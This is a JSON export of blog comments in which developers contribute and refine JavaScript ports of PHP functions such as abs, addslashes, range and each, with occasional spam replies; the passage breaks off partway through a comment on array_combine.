{"abs":[{"date":"2008-01-30 11:03:04","author":"Karol Kowalski","url":"","comment":"Why not use native JS Math.abs for this. I believe this should be faster than conditional expressions.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction abs( mixed_number )  {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: _argos\r\n    \/\/ *     example 1: abs(4.2);\r\n    \/\/ *     returns 1: 4.2\r\n    \/\/ *     example 2: abs(-4.2);\r\n    \/\/ *     returns 2: 4.2\r\n    \/\/ *     example 3: abs(-5);\r\n    \/\/ *     returns 3: 5\r\n    \/\/ *     example 4: abs('_argos');\r\n    \/\/ *     returns 4: 0\r\n\r\n\tvar abs=Math.abs( mixed_number )\r\n\treturn ( !isNaN ( abs) ) ? abs : 0\r\n}\r\n[\/CODE]"},{"date":"2008-01-30 12:48:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Karol Kowalski: Using native Javascript for this is probably best so I've updated the function. But I'm not totally certain that this is faster. Doesn't the Math libary have to be loaded or something? Can somebod shed a light on this?\r\n\r\nFor reference, this was the original by _argos:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction abs( mixed_number )  {\r\n    \/\/ +   original by: _argos\r\n    return ( ( !isNaN ( mixed_number ) ) ? ( ( mixed_number &lt; 0 ) ? ( mixed_number * -1 ) : mixed_number ) : 0 );\r\n}\r\n[\/CODE]"},{"date":"2008-01-30 15:03:31","author":"Karol Kowalski","url":"","comment":"I run a test and it appeared that my function with Math.abs was around 40% more time consuming than yours. I tried to optimize it and ended up with 20% gain, and the code is still smaller and more readable. I tested it in Firefox, IE7, Safari and Opera with similar results. To see what's causing the overhead I run a function that would just return Math.abs, withoud checking for validity, still it was 10% slower than your function. It seems that Math.abs API is always slower than what can be accomplished with JS hack, a bit sad.\r\n\r\nStill, for code readability I would sugget using the code of abs_math2.\r\n\r\nHere's the test code:\r\n[CODE=&quot;Javascript&quot;]\r\nif (!window['console']) {\r\n\r\nconsole={}\r\nconsole.log=alert\r\n}\r\n\r\nvar start;\r\n\r\nfunction abs_math2 ( mixed_number ) {\r\n  return ( ( isNaN ( mixed_number ) ) ? 0 : Math.abs ( mixed_number ) );\r\n}\r\n\r\nfunction abs_math( mixed_number )  {\r\n  var abs=Math.abs( mixed_number );\r\n  return ( !isNaN ( abs ) ) ? abs : 0\r\n}\r\n\r\nfunction abs_cond( mixed_number )  {\r\n  return ( ( !isNaN ( mixed_number ) ) ? ( ( mixed_number &lt; 0 ) ? ( mixed_number * -1 ) : mixed_number ) : 0 );\r\n}\r\n\r\n\r\nstart=new Date();\r\n\r\nfor (var i=100000;i;i--) {\r\n\r\nabs_cond(4.2);\r\nabs_cond(-4.2);\r\nabs_cond(-5);\r\nabs_cond('_argos');\r\nabs_cond(-Infinity);\r\n\r\n}\r\n\r\nconsole.log((new Date())-start)\r\n\r\n\r\nstart=new Date();\r\n\r\nfor (var i=100000;i;i--) {\r\n\r\nabs_math(4.2);\r\nabs_math(-4.2);\r\nabs_math(-5);\r\nabs_math('_argos');\r\nabs_math(-Infinity);\r\n\r\n}\r\n\r\nconsole.log((new Date())-start)\r\n\r\n\r\nstart=new Date();\r\n\r\nfor (var i=100000;i;i--) {\r\n\r\nabs_math2(4.2);\r\nabs_math2(-4.2);\r\nabs_math2(-5);\r\nabs_math2('_argos');\r\nabs_math2(-Infinity);\r\n\r\n}\r\n\r\nconsole.log((new Date())-start)\r\n\r\n\r\n\/\/my results\r\n\/\/Firefox 2.0.11\r\n\/\/1000\r\n\/\/1422\r\n\/\/1219\r\n\r\n\r\n[\/CODE]"},{"date":"2008-01-30 15:43:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Karol Kowalski: Awesome work Karol! I've updated the function. Thanks for putting in the extra effort. Greatly appreciated!"},{"date":"2008-01-30 22:24:48","author":"_argos","url":"","comment":"@Karol Kowalski : Hi, thanks for take the time to check my port, I make the same tests like you, because I think that native functions always are more slower, so ever I  use self hacks :p again thanxs for your time.\r\n\r\nPS: Sorry for my badly English, but i have 4 years without use it :p"},{"date":"2008-01-31 17:33:29","author":"_argos","url":"","comment":"Hi Kevin I'm here again look this ports.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif ( defined ( 'CONSTANTE' ) ) {\r\n\r\n    console.log ( CONSTANTE );\r\n\r\n}\r\n\r\nfunction defined ( constant_name ) {\r\n\r\n\treturn ( ( window [ constant_name ] !== undefined ) ? true : false );\r\n\r\n}\r\n\r\n\r\n\r\n\/\/ -----\r\n\r\n\/\/ [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\r\n\r\nconsole.log ( range ( 0, 12 ) );\r\n\r\n\r\n\r\n\/\/ [0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100]\r\n\r\nconsole.log ( range( 0, 100, 10 ) );\r\n\r\n\r\n\r\n\/\/ ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'];\r\n\r\nconsole.log ( range( 'a', 'i' ) );\r\n\r\n\r\n\r\n\/\/ ['c', 'b', 'a'];\r\n\r\nconsole.log ( range ('c', 'a' ) );\r\n\r\n\r\n\r\nfunction range ( low, high, step ) {\r\n\r\n\tvar matrix = [];\r\n\r\n\tvar inival, endval, plus;\r\n\r\n\tvar walker = step || 1;\r\n\r\n\tvar chars  = false;\r\n\r\n\t\r\n\r\n\tif ( !isNaN ( low ) &amp;&amp; !isNaN ( high ) ) {\r\n\r\n\t\tinival = low;\r\n\r\n\t\tendval = high;\t\t\r\n\r\n\t} else if ( isNaN ( low ) &amp;&amp; isNaN ( high ) ) {\r\n\r\n\t\tchars = true;\r\n\r\n\t\tinival = low.charCodeAt ( 0 );\r\n\r\n\t\tendval = high.charCodeAt ( 0 );\r\n\r\n\t} else {\r\n\r\n\t\tinival = ( isNaN ( low ) ? 0 : low );\r\n\r\n\t\tendval = ( isNaN ( high ) ? 0 : high );\r\n\r\n\t}\r\n\r\n\t\r\n\r\n\tplus = ( ( inival &gt; endval ) ? false : true );\r\n\r\n\t\r\n\r\n\tif ( plus ) {\r\n\r\n\t\twhile ( inival &lt;= endval ) {\r\n\r\n\t\t\tmatrix.push ( ( ( chars ) ? String.fromCharCode ( inival ) : inival ) );\r\n\r\n\t\t\tinival += walker;\r\n\r\n\t\t}\r\n\r\n\t} else {\r\n\r\n\t\twhile ( inival &gt;= endval ) {\r\n\r\n\t\t\tmatrix.push ( ( ( chars ) ? String.fromCharCode ( inival ) : inival ) );\r\n\r\n\t\t\tinival -= walker;\r\n\r\n\t\t}\r\n\r\n\t}\r\n\r\n\t\t\r\n\r\n\treturn matrix;\r\n\r\n}\r\n\r\n\r\n\r\n\/\/ -----\r\n\r\nconsole.log ( strcmp ( 'waldo', 'Waldo' ) );\r\n\r\nconsole.log ( strcmp ( 'Waldo', 'waldo' ) );\r\n\r\nconsole.log ( strcmp ( 'waldo', 'waldo' ) );\r\n\r\n\r\n\r\nfunction strcmp ( str1, str2 ) {\r\n\r\n\tvar size1 = str1.charCodeAt ( 0 );\r\n\r\n\tvar size2 = str2.charCodeAt ( 0 );\r\n\r\n\t\r\n\r\n\treturn ( ( size1 == size2 ) ? 0 : ( ( size1 &gt; size2 ) ? 1 : -1 ) );\r\n\r\n}\r\n[\/CODE]"},{"date":"2008-01-31 18:47:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ _argos: Nice work! Added!"},{"date":"2008-03-31 19:42:37","author":"Philip","url":"","comment":"Dunno where this belongs, but how about this code for echo()?\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction echo()\r\n{\r\n  for(i=0;i&lt;echo.arguments.length;i++)\r\n  {\r\n    if(document.body &amp;&amp; document.body.innerHTML) {\r\ndocument.body.innerHTML=document.body.innerHTML+echo.arguments[i];\r\n} else {\r\ndocument.write(echo.arguments[i]);\r\n}\r\n  }\r\n}\r\n[\/CODE]"},{"date":"2008-04-02 13:26:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Philip: Good idea, I'll add it, thanks!"},{"date":"2008-04-12 17:33:32","author":"Jonas Raoni","url":"","comment":"A shorter version of this would be:\r\n\r\nreturn Math.abs (n) || 0;"},{"date":"2008-04-12 20:24:25","author":"Philip","url":"","comment":"Hey, just fyi... Philip and Philip Peterson are both me ;-)"},{"date":"2008-04-13 12:29:58","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Thanks I'll update the function.\r\n@ Philip: I'll update your name!"},{"date":"2008-09-08 11:40:18","author":"Reena","url":"nill","comment":"Good"},{"date":"2009-01-09 21:34:02","author":"Nile","url":"unlinkthis.net","comment":"json_encode\r\n[CODE=&quot;Javascript&quot;]\r\nvar arr = new Array('Hello');\r\nvar applyEncode = function(varIn){\r\nreturn '{'+varIn+'}';\r\n}\r\nvar json_encode = function(value){\r\n   var data = '';\r\n   for(i=0,endCount='';i&lt;value.length;++i){\r\n   var endCount = (i!=value.length-1) ? &quot;, &quot; : &quot;&quot;;\r\n   data += '&quot;'+key(value[i])+'&quot; : &quot;'+value[key(value)]+'&quot;'+endCount;\r\n   }\r\n   return applyEncode(data);\r\n}\r\ndocument.write(json_encode(arr));\r\n[\/CODE]"},{"date":"2009-01-12 23:53:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nile: Hey Nile thanks for your contribution. Unfortunately there are a couple of issues with it:\r\n- depends on an outside function: applyEncode\r\n- does not support associative arrays (in terms of traversing)\r\n- does not support index arrays, numbers, etc (in terms of encoding)\r\n\r\nPlease have a look here:\r\nhttp:\/\/www.json.org\/json2.js\r\n\r\nThe code is public domain, so maybe it's possible to modify it and use it in PHP.JS. We could look into that!"},{"date":"2009-01-15 02:28:06","author":"Paul","url":"","comment":"I downloaded php.namespaced.*.js at 2009-01-14 15:28 HST.  There appears to be a space missing which is causing javascript errors.  Search string &quot;functionPropagation&quot;.  I was able to resolve the error in php.namespaced.js and php.namespaced.min.js, but not php.namespaced.packed.js due to the packing operation.\r\n\r\nBTW: This package is incredible!"},{"date":"2009-01-15 11:40:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paul: It was actually an issue in the exit function. Should be fixed now, thanks for letting us know!"},{"date":"2009-03-06 17:02:58","author":"Jay","url":"","comment":"You should really consider putting this project up on GitHub.com, it would be a perfect fit.  That way people could modify and improve the code, and then send you a pull request for you to merge their changes.  It's a very nice way to develop open source projects."},{"date":"2009-03-22 19:06:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jay: I'm working on 1 github project and a.t.m. I do not find the speed satisfying. I imagine all that SSH traffic causes quite some load but git pull times of > 60 seconds are just not acceptable. Maybe later though! Thanks"},{"date":"2009-09-04 19:14:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jay: \"Later\" has arrived. We're now on GitHub!\nhttp:\/\/github.com\/kvz\/phpjs\n\nSome more info about the change here:\nhttp:\/\/kevin.vanzonneveld.net\/techblog\/article\/svn_to_git\/"},{"date":"2012-04-10 09:49:50","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other "}],"addslashes":[{"date":"2008-01-21 18:35:41","author":"booeyOH","url":"","comment":"preg_quote() function for adding slashes to RegEx\r\n\r\nNot sure if it is out there, but needed something quick, hope its helpful\r\n[CODE=&quot;Javascript&quot;]\r\nfunction preg_quote( str ) {\r\n\tvar quote_chars = [&quot;\\\\&quot;, &quot;.&quot;, &quot;+&quot;, &quot;*&quot;, &quot;?&quot;, &quot;[&quot;, &quot;^&quot;, &quot;]&quot;, &quot;$&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;}&quot;, &quot;=&quot;, &quot;!&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;|&quot;, &quot;:&quot;];\r\n\tvar return_val = str;\r\n\t\r\n\tfor(var i=0;i&lt;quote_chars.length;i++)\r\n\t\t{\r\n\t\teval(&quot;var pattern = \/\\\\&quot;+quote_chars[i]+&quot;\/gi&quot;);\r\n\t\treturn_val = return_val.replace(pattern, chr(92)+quote_chars[i]);\r\n\t\t}\r\n\t\r\n\treturn return_val;\r\n}\r\n[\/CODE]"},{"date":"2008-01-22 07:40:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ booeyOH: It sure is! Thank you!"},{"date":"2008-01-23 18:14:03","author":"Ates Goral","url":"","comment":"First, just a nitpick:\r\n\r\nA set of characters can be used instead of the ORs:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn str.replace(\/([&quot;'\\\\])\/g, &quot;\\\\$1&quot;);\r\n[\/CODE]\r\n\r\nTo add support for NUL:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn str.replace(\/([&quot;'\\\\])\/g, &quot;\\\\$1&quot;).replace(\/\\0\/g, &quot;\\\\0&quot;);\r\n[\/CODE]"},{"date":"2008-01-23 18:18:10","author":"Ates Goral","url":"","comment":"Additional test case:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ *     example 2: addslashes(&quot;\\&quot;'\\\\\\0&quot;);\r\n    \/\/ *     returns 2: &quot;\\\\\\&quot;\\\\\\'\\\\\\\\\\\\\\0&quot;\r\n[\/CODE]"},{"date":"2008-01-23 20:24:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Processed."},{"date":"2008-02-27 23:47:40","author":"Martin","url":"","comment":"example 1 (the only one) on this page is incorrect, in that it doesn't actually add the slash. hehe."},{"date":"2008-02-28 12:58:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martin: Thanks for noticing. If you look at the source code, you see that the example is correct. But my blog probably filters out the backslash again. I'll look into it!"},{"date":"2008-03-01 17:02:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martin: Fixed!"},{"date":"2008-04-12 17:48:16","author":"Jonas Raoni","url":"","comment":"It's missing the &quot;\\&quot; escape.\r\n\r\nreturn str.replace(\/([&quot;'\\\\])\/g, &quot;\\\\$1&quot;).replace(\/\\0\/g, &quot;\\\\0&quot;)\t;\r\n\r\nOr\r\n\r\nreturn str.replace(\/([&quot;'\\\\\\0])\/g, function(_, n){\r\n\treturn &quot;\\\\&quot; + (n == &quot;\\0&quot; ? &quot;0&quot; : n);\r\n});"},{"date":"2008-04-13 12:34:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: I believe your proposal has the same regex, only here it's singlequoted for compatbility with Dean Edwards packer."},{"date":"2008-05-24 01:03:58","author":"Sean Gallagher","url":"","comment":"Here is another quicky but good add slashes function!\r\n\r\nP.S. I could not get your function to work.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction addslashes(str)\r\n{\r\n  \/\/ http:\/\/www.atlwebsite.com\r\n \/\/ By Sean Gallagher\r\n \/\/ Example: addslashes('what &quot;ya\\'ll&quot; doing?')\r\n \/\/ Returns: what \\&quot;ya\\'ll\\&quot; doing?\r\n str = str.replace(\/'\/g,&quot;\\\\'&quot;);\r\n return str.replace(\/&quot;\/g,'\\\\&quot;');\r\n}\r\n[\/CODE]"},{"date":"2008-05-30 22:57:47","author":"Dudi","url":"","comment":"It doesn't seem like the function works. And the example is wrong again. ;-)"},{"date":"2008-05-31 14:29:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dudi: That's just my blog messing up 'addslashes'. Fixed though."},{"date":"2008-07-22 07:41:52","author":"Nate","url":"","comment":"I couldn't get the function to work at first.  I made some changes, and here is what I came up with:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn str.replace(\/([\\\\&quot;'])\/g, &quot;\\\\$1&quot;).replace(\/\\0\/g, &quot;\\\\0&quot;);\r\n[\/CODE]\r\n\r\nAlso, the example should read,\r\n&quot;kevin\\\\\\'s birthday&quot; because the \\' becomes '.  That is why it appears to work in the tester script."},{"date":"2008-08-08 11:49:10","author":"Onno Marsman","url":"","comment":"It's probably also a good idea to convert str to a string to make sure .replace exists. \r\naddslashes(6) does work in PHP but not in this function\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (str+'').replace(\/([\\\\&quot;'])\/g, &quot;\\\\$1&quot;).replace(\/\\0\/g, &quot;\\\\0&quot;);\r\n[\/CODE]"},{"date":"2008-08-27 18:10:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate &amp; Onno Marsman: Awesome job guys! I have been fooled by my tester for a long time. Addslashes has ben updated, and you have been credited accordingly. I've also changed the new testsuite to support addslashes behaviour."},{"date":"2008-09-21 15:37:57","author":"Julien Paquit","url":"","comment":"Very useful code ! Because of some scripting needs (and compatibility), I add this portion of code to the original one :\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn (str+'').replace(\/([&quot;])\/g, &quot;&amp;quot;&quot;).replace(\/([\\\\'])\/g, &quot;\\\\$1&quot;).replace(\/\\0\/g, &quot;\\\\0&quot;);\r\n[\/CODE]\r\n\r\nNow I am able to pass recursively parameters without errors."},{"date":"2008-09-21 22:01:07","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Julien Paquit: Thank you but I believe PHP does not do that automatically? If not, then we should not either, because we may surprise developers &amp; cause unexpected output."},{"date":"2008-09-23 00:14:19","author":"Julien Paquit","url":"","comment":"Kevin : you are totally right. That was just a tip ;)"},{"date":"2009-06-30 08:40:10","author":"Denny Wardhana","url":"","comment":"Under \"Strict Warnings\" setup, \n[CODE]\n\/\\0\/g\n[\/CODE]\nproduces Warning: non-octal digit in an escape sequence that doesn't match a back-reference.\n\nHow to remove that warning (and the function still working of course)?\n"},{"date":"2009-06-30 11:45:20","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Denny: Thanks for the report. I've fixed it in SVN. (use \\u0000 instead--\"\\u\" indicates a 4-digit hexadecimal Unicode sequence and \\0 was a shortcut for this)"},{"date":"2010-04-11 00:58:56","author":null,"url":"http:\/\/oskar-lh.name","comment":"Hi,\n[code]replace(\/[\\\\\"']\/g, \"\\\\$&\")[\/code]\nmight be faster than\n[code]replace(\/([\\\\\"'])\/g, \"\\\\$1\")[\/code]"},{"date":"2010-04-11 01:00:00","author":null,"url":"http:\/\/oskar-lh.name","comment":"Hi,\nreplace(\/[\\\\\"']\/g, \"\\\\$&\")\nmight be faster than\nreplace(\/([\\\\\"'])\/g, \"\\\\$1\")"},{"date":"2010-04-11 08:58:25","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Oskar: Thanks, good point! Changed in git..."},{"date":"2010-12-25 03:05:13","author":"ball","url":"","comment":"thanks a lot!!!"},{"date":"2011-05-05 10:30:40","author":"Denis","url":"www.divasbydesign.co.za","comment":"very helpful :)"},{"date":"2011-05-05 10:31:29","author":"Denis","url":"http:\/\/www.divasbydesign.co.za","comment":"I found this very helpful in my coding :)"},{"date":"2011-07-28 11:00:22","author":"?","url":"","comment":"'\n"},{"date":"2012-03-30 14:29:59","author":"praveen","url":"ajkds@ff.com","comment":"adsdajdhadehaijdeiojni bondha"},{"date":"2012-03-30 14:31:30","author":"praveen","url":"ajkds@ff.com","comment":"oka mukka ardam kaledu ra yedava"},{"date":"2012-05-06 09:32:18","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting \n\n"}],"array":[{"date":"2008-06-19 17:13:13","author":"thinsoldier","url":"","comment":"what about associative arrays?\r\nvar Divs = array(); \/\/ array of divs that I want to sort\r\nDivs['amelie'] = divHtmlElement3;\r\nDivs['randolph'] = divHtmlElement1;\r\nDivs['judy'] = divHtmlElement9;\r\n\r\nasort(Divs);\r\n\r\nshowDivArray(Divs);"},{"date":"2008-06-19 18:29:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ thinsoldier: What about them? Judging by your comment I would think you mean that our asort doesn't support them.. But it appears we don't have an asort yet ;)\r\nJavaScript does support them in general. But they're called objects to be strict.\r\nBut I guess I don't fully understand your question."},{"date":"2008-09-09 18:15:57","author":"covings","url":"http:\/\/www.cornicescentre.co.uk","comment":"VERY INTERESTING AND REALLY USEFUL INFORMATIONS! THX SO MUTCH"},{"date":"2008-10-05 10:08:55","author":"thinsoldier","url":"","comment":"what about\r\n\r\narray('first'=&gt;'Kevin', 'last'=&gt;'Zonnevelt')"},{"date":"2008-10-06 12:09:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ thinsoldier: Yes that would be very nice, but I don't see how we could implement that unfortunately :( Here we run against the hard wall of language differences."},{"date":"2008-11-29 20:59:46","author":"Sean","url":"","comment":"@Kevin: Could you not do:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\narray(&quot; 'first' =&gt; 'kevin' &quot;, &quot; 'last' =&gt; 'Zonnevelt' &quot; );\r\n[\/CODE]\r\n\r\nIt's not quite the same as php, but at least this way you could create hash arrays"},{"date":"2008-11-30 08:53:16","author":"Onno Marsman","url":"","comment":"@Sean: We already can create associative arrays with JS:\r\n[CODE=&quot;Javascript&quot;]\r\n{\r\n    'first': 'kevin',\r\n    'last': 'Zonnevelt' \/\/I don't know why this is with a T ;)\r\n}\r\n[\/CODE]\r\nTechnically this is not an array but an object, but your proposal wouldn't return anything different. So we already have a syntax that is &quot;not quite the same as php&quot; and it does exactly the same.\r\n\r\nAlso think of using variables:\r\n[CODE=&quot;Javascript&quot;]\r\n{ a: b, c: d}\r\n[\/CODE]\r\nYour alternative would result in something like this, because proper escaping is needed:\r\n[CODE=&quot;Javascript&quot;]\r\narray(&quot; '&quot;+addslashes(a)+&quot;' =&gt; '&quot;+addslashes(b)+&quot;' &quot;, &quot; '&quot;+addslashes(c)+&quot;' =&gt; '&quot;+addslashes(d)+&quot;' &quot; );\r\n[\/CODE]\r\nI hope I didn't make any typo's, but I think my point is clear."},{"date":"2008-12-01 09:31:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Sean &amp; Onno Marsman: I totally agree with Onno. If we can't get it right, and people have to learn a different notation anyway, let's just stick with JavaScript."},{"date":"2008-12-05 06:19:53","author":"Ates Goral","url":"http:\/\/magnetiq.com","comment":"function each(arr) {\r\n    \/\/ Return the current key and value pair from an array and advance the array cursor\r\n\r\n    \/\/ +   original by: Ates Goral (http:\/\/magnetiq.com)\r\n    \/\/ *     example 1: each([42,43]);\r\n    \/\/ *     returns 1: {0: 0, 1: 42, key: 0, value: 42}\r\n    \/\/ *     example 2: each({a:&quot;apple&quot;,b:&quot;balloon&quot;});\r\n    \/\/ *     returns 2: {0:&quot;a&quot;,1:&quot;apple&quot;,key:&quot;a&quot;,value:&quot;apple&quot;}\r\n    if (!(arr instanceof Object) || (arr._keys &amp;&amp; !arr._keys.length)) {\r\n        return false;\r\n    }\r\n\r\n    if (!arr._keys) {\r\n        arr._keys = [];\r\n        \r\n        for (var k in arr) {\r\n            if (k != &quot;_keys&quot;) {\r\n                arr._keys.push(k);\r\n            }\r\n        }\r\n    }\r\n    \r\n    var k = arr._keys.shift();\r\n    var v = arr[k];\r\n    \r\n    return {\r\n        0: k,\r\n        1: v,\r\n        key: k,\r\n        value: v\r\n    };\r\n}"},{"date":"2008-12-05 06:22:48","author":"Ates Goral","url":"http:\/\/magnetiq.com","comment":"I apologize for the earlier, unformatted post :)\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction each(arr) {\r\n    \/\/ Return the current key and value pair from an array and advance the array cursor\r\n\r\n    \/\/ +   original by: Ates Goral (http:\/\/magnetiq.com)\r\n    \/\/ *     example 1: each([42,43]);\r\n    \/\/ *     returns 1: {0: 0, 1: 42, key: 0, value: 42}\r\n    \/\/ *     example 2: each({a:&quot;apple&quot;,b:&quot;balloon&quot;});\r\n    \/\/ *     returns 2: {0:&quot;a&quot;,1:&quot;apple&quot;,key:&quot;a&quot;,value:&quot;apple&quot;}\r\n    if (!(arr instanceof Object) || (arr._keys &amp;&amp; !arr._keys.length)) {\r\n        return false;\r\n    }\r\n\r\n    if (!arr._keys) {\r\n        arr._keys = [];\r\n        \r\n        for (var k in arr) {\r\n            if (k != &quot;_keys&quot;) {\r\n                arr._keys.push(k);\r\n            }\r\n        }\r\n    }\r\n    \r\n    var k = arr._keys.shift();\r\n    var v = arr[k];\r\n    \r\n    return {\r\n        0: k,\r\n        1: v,\r\n        key: k,\r\n        value: v\r\n    };\r\n}\r\n[\/CODE]"},{"date":"2008-12-05 06:27:32","author":"Ates Goral","url":"http:\/\/magnetiq.com","comment":"Perhaps the each() implementation I have below is a hasty one. It won't play nice with reset(), next() and previous(). It can be improved by actually storing the cursor position instead of consuming the key array with the shift(). I'll try to improve it and provide reset\/next\/prev if I find the time."},{"date":"2008-12-10 17:22:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Wow thanks a lot Ates! We'll leave it open for improvement then! Though I don't really like the idea of global variables, I believe the include_once functions also already work like that so we may be able to do that here as well. What do you think?"},{"date":"2010-09-05 16:56:38","author":"baterie s?oneczne","url":"http:\/\/www.actionenergy.pl","comment":"Wow! it seems that someone did really great stuff here! Lovely!"},{"date":"2011-08-27 21:18:20","author":"aaa","url":"","comment":"ewewe"},{"date":"2012-04-17 15:33:14","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"array_change_key_case":[{"date":"2008-05-17 16:12:15","author":"d3x","url":"","comment":"Javascript equivalent for the PHP array():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array(){\r\nreturn Array.prototype.slice.call(arguments);\r\n}\r\n[\/CODE]"},{"date":"2008-05-17 16:41:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ d3x: Awesome!!!! Added."},{"date":"2009-01-08 16:44:09","author":"Scot Diddle","url":"www.webtdo.com","comment":"Hi,\r\n\r\nI am building a PHP\/JS page to call, process, and display the results of eache php.js function.\r\n\r\nI'm not sure why I am getting back '[object object]' for array_change_key_case();\r\n\r\n[CODE=\"php\"]\r\n\t\t\r\n\t\/**\r\n\t * \r\n\t *  array_change_key_case()\r\n\t * \r\n\t *\/\r\n\t\r\n\t  $integer = 42;\r\n\t  \r\n\t $simpleArray = '[ 3, 5 ]';\r\n\t \r\n\t $associativeArrray = \"{ FuBaR: 42, Dry: 'Do not repeat repeat yourself' } \";\r\n\t \r\n\t $associativeArrrayForDisplay = \"{ FuBaR: 42, Dry: \\'Do not repeat repeat yourself\\' } \";\r\n[\/CODE]\r\n\r\n [CODE=\"javascript\"]\r\n\r\n\t\tvar answer = confirm(\"Show: array_change_key_case() ?\");\r\n\r\n\t\tif (answer) {\r\n\t\t\t\r\n\t\t\tvar array_change_key_case_query = array_change_key_case(<?php echo $integer ?>);   \r\n\t\t\talert('array(<?php echo $integer; ?>)  : ' + array_change_key_case_query);\r\n\t\t\t\r\n\t\t\tvar array_change_key_case_query = array_change_key_case(<?php echo $simpleArray ?>);   \r\n\t\t\talert('array(<?php echo $simpleArray; ?>)  : ' + array_change_key_case_query);\r\n\t\t\t\t\t\t\r\n\t\t\tvar array_change_key_case_query = array_change_key_case(<?php echo $associativeArrray ?>);   \r\n\t\t\t\r\n\t\t\tfor (a in array_change_key_case_query) {\r\n\t\t\t\r\n\t\t\t\talert('array(<?php echo $associativeArrrayForDisplay; ?>)  : ' + a);\r\n\t\t\t\t\r\n\t\t\t}\r\n\r\n\t\t}\r\n\r\n[\/CODE]\r\n\r\nThe \"For (a in Oject) returns the Index in lower case, but where did the value(s) associated with the new lowercase index go... How do you use the output from this function. ?\r\n\r\nThanks, Scot L. Diddle"},{"date":"2009-01-08 17:11:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Scot Diddle: Our testsuite does not produce any unexpected results with the example-based test-cases. Currently it is not clear to me what statement exactly fails.\r\n\r\nIf the question is just how to get a value from an object-element:\r\n[CODE=&quot;Javascript&quot;]\r\nfor (a in array_change_key_case_query) {\r\n    \/\/ a is the key\r\n    val = array_change_key_case_query[a];\r\n    \/\/ val is now the value of the element with key: a\r\n}\r\n[\/CODE]"},{"date":"2009-01-08 17:16:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Scot Diddle: PS, may I ask to what purpose you are building this page? If it is for testing purposes you may want to look into our testsuite which runs from commandline (mac &amp; linux)."}],"array_chunk":[{"date":"2008-04-12 17:53:36","author":"Jonas Raoni","url":"","comment":"Put a link on the name of Carlos R. L. Rodrigues to our site at http:\/\/jsfromhell.com ^^"},{"date":"2008-04-13 13:02:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Done!"},{"date":"2009-01-13 12:42:07","author":"Douwe","url":"","comment":"You use constant_name as a function parameter, but in the function you use constant..."}],"array_combine":[{"date":"2012-05-16 07:42:38","author":"Fred P","url":"","comment":"You can fix line #21 permanently like this:\n\n[CODE]\n    var new_array = {},\n         keycount = (keys && keys.length) || 0,\n         i = 0;\n\nthen this 